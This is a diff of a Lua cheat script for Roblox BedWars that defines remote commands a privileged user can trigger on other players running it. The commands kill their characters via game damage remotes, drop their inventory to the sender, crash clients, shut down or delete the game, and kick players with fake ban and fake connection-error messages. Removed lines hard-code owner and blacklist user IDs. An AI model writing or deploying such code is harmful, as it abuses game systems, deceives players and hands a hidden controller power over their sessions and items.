@@ -1,14 +1,9 @@
-local getasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end
-local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end
-local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
-
-local Player = Player.Character
-local function CommandOwnerI()
+local commands = {
 	["kill"] = function(args, plr)
-		if Player then
-			local hum = Player.character.Humanoid
-			bedwars["DamageController"]:requestSelfDamage(math.huge, 0, "69", {fromPlayer = bedwars["getPlayerTable"]:getPlayer(plr)})
-			task.delay(0.2, function()
+		if entity.isAlive then
+			local hum = entity.character.Humanoid
+			bedwars["DamageController"]:requestSelfDamage(lplr.Character:GetAttribute("Health"), 3, "69", {fromEntity = {getInstance = function() return plr.Character end}})
+			task.delay(0.1, function()
 				if hum and hum.Health > 0 then 
 					hum:ChangeState(Enum.HumanoidStateType.Dead)
 					hum.Health = 0
@@ -17,39 +12,51 @@ local function CommandOwnerI()
 			end)
 		end
 	end,
-	["Fling"] = function(args)
-		if Player then
-			Player.character.HumanoidRootPart.CFrame = addvectortocframe(Player.character.HumanoidRootPart.CFrame, vec3(999999999999, 19191919199119191199, 18291938382919199293938381)
+	["steal"] = function(args, plr)
+		if GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["Enabled"] then 
+			GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["ToggleButton"](false)
+			task.wait(1)
+		end
+		for i,v in pairs(currentinventory.inventory.items) do 
+			local e = bedwars["ClientHandler"]:Get(bedwars["DropItemRemote"]):CallServer({
+				item = v.tool,
+				amount = v.amount ~= math.huge and v.amount or 99999999
+			})
+			if e then 
+				e.CFrame = plr.Character.HumanoidRootPart.CFrame
+			else
+				v.tool:Destroy()
+			end
 		end
 	end,
 	["lagback"] = function(args)
-		if Player then
-			Player.character.HumanoidRootPart.Velocity = vec3(9999999, 9999999, 9999999)
+		if entity.isAlive then
+			entity.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
 		end
 	end,
 	["jump"] = function(args)
-		if Player and Player.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
-			Player.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+		if entity.isAlive and entity.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+			entity.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
 		end
 	end,
 	["sit"] = function(args)
-		if Player then
-			Player.character.Humanoid.Sit = true
+		if entity.isAlive then
+			entity.character.Humanoid.Sit = true
 		end
 	end,
 	["unsit"] = function(args)
-		if Player then
-			Player.character.Humanoid.Sit = false
+		if entity.isAlive then
+			entity.character.Humanoid.Sit = false
 		end
 	end,
 	["freeze"] = function(args)
-		if Player then
-			Player.character.HumanoidRootPart.Anchored = true
+		if entity.isAlive then
+			entity.character.HumanoidRootPart.Anchored = true
 		end
 	end,
 	["unfreeze"] = function(args)
-		if Player then
-			Player.character.HumanoidRootPart.Anchored = false
+		if entity.isAlive then
+			entity.character.HumanoidRootPart.Anchored = false
 		end
 	end,
 	["deletemap"] = function(args)
@@ -58,31 +65,31 @@ local function CommandOwnerI()
 		end
 	end,
 	["void"] = function(args)
-		if Player then
+		if entity.isAlive then
 			task.spawn(function()
 				repeat
-					task.wait(0.2)
-					Player.character.HumanoidRootPart.CFrame = addvectortocframe(Player.character.HumanoidRootPart.CFrame, vec3(0, -20, 0))
-				until not Player
+					task.wait()
+					entity.character.HumanoidRootPart.CFrame = addvectortocframe(entity.character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
+				until not entity.isAlive
 			end)
 		end
 	end,
 	["framerate"] = function(args)
 		if #args >= 1 then
 			if setfpscap then
-				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]), 1, 9999) or 9999)
+				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
 			end
 		end
 	end,
 	["crash"] = function(args)
-		setfpscap(100000000)
+		setfpscap(9e9)
     	print(game:GetObjects("h29g3535")[1])
 	end,
 	["chipman"] = function(args)
 		local function funnyfunc(v)
 			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
 				v.Image = "http://www.roblox.com/asset/?id=6864086702"
-				v:GetPropertyChangedSignal("Image"):connect(function()
+				v:GetPropertyChangedSignal("Image"):Connect(function()
 					v.Image = "http://www.roblox.com/asset/?id=6864086702"
 				end)
 			end
@@ -90,7 +97,7 @@ local function CommandOwnerI()
 				if v.Text ~= "" then
 					v.Text = "chips"
 				end
-				v:GetPropertyChangedSignal("Text"):connect(function()
+				v:GetPropertyChangedSignal("Text"):Connect(function()
 					if v.Text ~= "" then
 						v.Text = "chips"
 					end
@@ -98,19 +105,19 @@ local function CommandOwnerI()
 			end
 			if v:IsA("Texture") or v:IsA("Decal") then
 				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
-				v:GetPropertyChangedSignal("Texture"):connect(function()
+				v:GetPropertyChangedSignal("Texture"):Connect(function()
 					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
 				end)
 			end
 			if v:IsA("MeshPart") then
 				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
-				v:GetPropertyChangedSignal("TextureID"):connect(function()
+				v:GetPropertyChangedSignal("TextureID"):Connect(function()
 					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
 				end)
 			end
 			if v:IsA("SpecialMesh") then
 				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
-				v:GetPropertyChangedSignal("TextureId"):connect(function()
+				v:GetPropertyChangedSignal("TextureId"):Connect(function()
 					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
 				end)
 			end
@@ -127,13 +134,13 @@ local function CommandOwnerI()
 		for i,v in pairs(game:GetDescendants()) do
 			funnyfunc(v)
 		end
-		game.DescendantAdded:connect(funnyfunc)
+		game.DescendantAdded:Connect(funnyfunc)
 	end,
 	["rickroll"] = function(args)
 		local function funnyfunc(v)
 			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
 				v.Image = "http://www.roblox.com/asset/?id=7083449168"
-				v:GetPropertyChangedSignal("Image"):connect(function()
+				v:GetPropertyChangedSignal("Image"):Connect(function()
 					v.Image = "http://www.roblox.com/asset/?id=7083449168"
 				end)
 			end
@@ -141,7 +148,7 @@ local function CommandOwnerI()
 				if v.Text ~= "" then
 					v.Text = "Never gonna give you up"
 				end
-				v:GetPropertyChangedSignal("Text"):connect(function()
+				v:GetPropertyChangedSignal("Text"):Connect(function()
 					if v.Text ~= "" then
 						v.Text = "Never gonna give you up"
 					end
@@ -149,19 +156,19 @@ local function CommandOwnerI()
 			end
 			if v:IsA("Texture") or v:IsA("Decal") then
 				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
-				v:GetPropertyChangedSignal("Texture"):connect(function()
+				v:GetPropertyChangedSignal("Texture"):Connect(function()
 					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
 				end)
 			end
 			if v:IsA("MeshPart") then
 				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
-				v:GetPropertyChangedSignal("TextureID"):connect(function()
+				v:GetPropertyChangedSignal("TextureID"):Connect(function()
 					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
 				end)
 			end
 			if v:IsA("SpecialMesh") then
 				v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
-				v:GetPropertyChangedSignal("TextureId"):connect(function()
+				v:GetPropertyChangedSignal("TextureId"):Connect(function()
 					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
 				end)
 			end
@@ -178,7 +185,7 @@ local function CommandOwnerI()
 		for i,v in pairs(game:GetDescendants()) do
 			funnyfunc(v)
 		end
-		game.DescendantAdded:connect(funnyfunc)
+		game.DescendantAdded:Connect(funnyfunc)
 	end,
 	["gravity"] = function(args)
 		workspace.Gravity = tonumber(args[1]) or 192.6
@@ -188,17 +195,24 @@ local function CommandOwnerI()
 		for i,v in pairs(args) do
 			str = str..v..(i > 1 and " " or "")
 		end
-		lplr:Kick(str)
+		task.spawn(function()
+			lplr:Kick(str)
+		end)
+		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
 	end,
---[[
+	["ban"] = function(args)
+		task.spawn(function()
+			lplr:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
+		end)
+		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
+	end,
 	["uninject"] = function(args)
-		kavo["SelfDestruct"]()
+		GuiLibrary["SelfDestruct"]()
 	end,
---]]
 	["disconnect"] = function(args)
 		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
 			if obj.Name == "ErrorMessage" then
-				obj:GetPropertyChangedSignal("Text"):connect(function()
+				obj:GetPropertyChangedSignal("Text"):Connect(function()
 					obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
 				end)
 			end
@@ -206,7 +220,7 @@ local function CommandOwnerI()
 				local clone = obj:Clone()
 				clone.Name = "LeaveButton2"
 				clone.Parent = obj.Parent
-				clone.MouseButton1Click:connect(function()
+				clone.MouseButton1Click:Connect(function()
 					clone.Visible = false
 					local video = Instance.new("VideoFrame")
 					video.Video = getcustomassetfunc("vape/assets/skill.webm")
@@ -226,7 +240,7 @@ local function CommandOwnerI()
 					textlab.Font = Enum.Font.Gotham
 					textlab.BackgroundTransparency = 1
 					textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-					video.Loaded:connect(function()
+					video.Loaded:Connect(function()
 						video.Visible = true
 						video:Play()
 						task.spawn(function()
@@ -243,7 +257,7 @@ local function CommandOwnerI()
 					task.spawn(function()
 						pcall(function()
 							if getconnections then
-								getconnections(Player.character.Humanoid.Died)
+								getconnections(entity.character.Humanoid.Died)
 							end
 							print(game:GetObjects("h29g3535")[1])
 						end)
@@ -256,21 +270,22 @@ local function CommandOwnerI()
 		task.wait(0.1)
 		lplr:Kick()
 	end,
+	["togglemodule"] = function(args)
+		if #args >= 1 then
+			local module = GuiLibrary["ObjectsThatCanBeSaved"][args[1].."OptionsButton"]
+			if module then
+				if module["Api"]["Enabled"] == (not args[2] == "true") then
+					module["Api"]["ToggleButton"]()
+				end
+			end
+		end
+	end,
+	["shutdown"] = function(args)
+		game:Shutdown()
+	end,
+	["errorkick"] = function(args)
+		if entity.isAlive then 
+			pcall(function() lplr.Character.Head:Destroy() end)
+		end
+	end
 }
-end
-
-local Owner = {3996873941}
-
-if table.find(Owner, lplr.UserId) then
-   CommandOwnerI()
-end
-
-local function blacklist()
-lplr:Kick("Blacklisted : Forever")
-end
-
-local blacklistuser = {104335207}
-
-if table.find(blacklistuser, lplr.UserId) then
-   blacklist()
-end
